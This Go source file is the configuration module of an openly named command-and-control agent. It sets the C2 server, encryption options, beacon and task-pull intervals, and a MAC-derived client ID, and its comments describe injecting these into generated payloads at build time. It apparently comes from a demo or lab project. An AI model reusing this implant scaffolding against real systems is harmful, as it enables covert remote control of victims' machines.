package main

import (
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
)

// 配置项（生成 Payload 时可注入，或运行时通过环境变量/命令行覆盖）
// 与 agent.py 默认值对齐: C2_SERVER / C2_ENC_ALGO / C2_ENC_PASSWORD
type Config struct {
	C2Server     string
	EncAlgo      string
	EncPassword  string
	HeartbeatSec int
	PullInterval int
	ClientID     string
}

// 包级变量：通过 go build -ldflags "-X 'main.C2Server=...' -X 'main.EncAlgo=...' -X 'main.EncPassword=...'" 注入
// 优先级最高：ldflags 注入 > 环境变量 > 命令行参数 > 硬编码默认值
var (
	C2Server    string
	EncAlgo     string
	EncPassword string
)

func loadConfig() *Config {
	c := &Config{
		C2Server:     "http://127.0.0.1:5000",
		EncAlgo:      "aes-128-cbc",
		EncPassword:  "C2DemoKey2024!!!",
		HeartbeatSec: 30, // 与 agent.py main 循环实际行为一致(每30秒重新心跳)
		PullInterval: 3,
	}
	// ldflags 注入优先级最高（生成 EXE 时由 payload_gen.go 通过 -X 设置）
	if C2Server != "" {
		c.C2Server = C2Server
	}
	if EncAlgo != "" {
		c.EncAlgo = EncAlgo
	}
	if EncPassword != "" {
		c.EncPassword = EncPassword
	}
	// 环境变量次之（用于 go run 或未注入场景）
	if v := os.Getenv("C2_SERVER"); v != "" {
		c.C2Server = v
	}
	if v := os.Getenv("C2_ENC_ALGO"); v != "" {
		c.EncAlgo = v
	}
	if v := os.Getenv("C2_ENC_PASSWORD"); v != "" {
		c.EncPassword = v
	}
	// 命令行参数（覆盖环境变量）
	flag.StringVar(&c.C2Server, "server", c.C2Server, "C2 服务器地址 (例: http://1.2.3.4:5000)")
	flag.StringVar(&c.EncAlgo, "enc-algo", c.EncAlgo, "加密算法: none|aes-128-cbc|aes-256-cbc|xor|rc4|chacha20")
	flag.StringVar(&c.EncPassword, "enc-password", c.EncPassword, "加密密码")
	flag.IntVar(&c.HeartbeatSec, "heartbeat", c.HeartbeatSec, "心跳间隔(秒)")
	flag.IntVar(&c.PullInterval, "pull-interval", c.PullInterval, "任务拉取间隔(秒)")
	flag.Parse()
	c.ClientID = computeClientID()
	return c
}

// computeClientID 与 agent.py 一致: md5(str(MAC_int))[:16]
// Python uuid.getnode() 返回 MAC 地址的 48 位整数表示
func computeClientID() string {
	if ifaces, err := net.Interfaces(); err == nil {
		for _, ifc := range ifaces {
			if ifc.Flags&net.FlagLoopback != 0 {
				continue
			}
			mac := ifc.HardwareAddr
			if len(mac) < 6 {
				continue
			}
			var n uint64
			for _, b := range mac {
				n = (n << 8) | uint64(b)
			}
			s := strconv.FormatUint(n, 10)
			h := md5.Sum([]byte(s))
			return hex.EncodeToString(h[:])[:16]
		}
	}
	// 无网卡时回退随机 ID
	b := make([]byte, 8)
	rand.Read(b)
	h := md5.Sum(b)
	return hex.EncodeToString(h[:])[:16]
}

// runtimeInfo 返回运行时标识，用于日志
func runtimeInfo() string {
	return fmt.Sprintf("%s/%s %s", runtime.GOOS, runtime.GOARCH, runtime.Version())
}
